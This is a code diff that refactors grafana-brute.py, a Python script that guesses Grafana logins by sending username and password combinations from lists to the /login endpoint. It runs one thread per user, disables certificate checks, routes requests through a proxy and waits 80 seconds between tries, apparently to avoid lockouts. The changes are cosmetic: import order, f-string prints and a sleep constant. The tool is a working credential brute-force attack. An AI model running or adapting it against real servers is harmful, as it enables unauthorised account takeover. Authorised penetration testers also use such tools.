@@ -1,20 +1,17 @@
 #!/usr/bin/env python
 #
-#
 # grafana-brute.py
 # Read from a list of combinations for logins for grafana
 #
 # ref: https://raw.githubusercontent.com/RandomRobbieBF/grafana-bruteforce/master/grafana-brute.py
 #
 
-import requests
-import json
-import argparse
-import sys
-import os
-import time
-import threading
 from colorama import Fore, Style
+import argparse
+import requests
+import sys
+import threading
+import time
 
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
@@ -28,6 +25,7 @@ proxyDict = {
               "ftp"   : http_proxy
             }
 
+SLEEP_TIME= 1 * 60 + 20
 
 def login_thread(url: str, user: str , pass_list: list[str]) -> None:
     try:
@@ -44,13 +42,13 @@ def login_thread(url: str, user: str , pass_list: list[str]) -> None:
             response2 = session.post(""+url+"/login", data=rawBody, headers=headers2, verify=False,timeout=10,proxies=proxyDict)
             if response2.status_code != 200:
                 if response2.status_code == 401:
-                    print ("Username: "+user+" Password:"+password+" Failed")
+                    print(f"Username: {user} Password: {password} Failed")
             if response2.status_code == 200:
                 if "Logged in" in response2.text:
-                    print (f"{Fore.GREEN}Username: {user}, Password: {password} Sucessful{Style.RESET_ALL}")
+                    print(f"{Fore.GREEN}Username: {user}, Password: {password} Sucessful{Style.RESET_ALL}")
                 else:
-                    print ("Username: "+user+" Password:"+password+" Failed - Check Proxy for response to see why.")
-            time.sleep(1 * 60 + 20)
+                    print(f"Username: {user} Password: {password} Failed - Check Proxy for response to see why.")
+            time.sleep(SLEEP_TIME)
 
     except Exception as why:
         print('Error: %s' % why)
@@ -77,9 +75,6 @@ def main(args):
         for user in userlist:
             t = threading.Thread(target=login_thread, args=(url, user, passlist), name=f"{user}-login")
             t.start()
-
-
-
 
     except IOError:
         print("File not accessible")
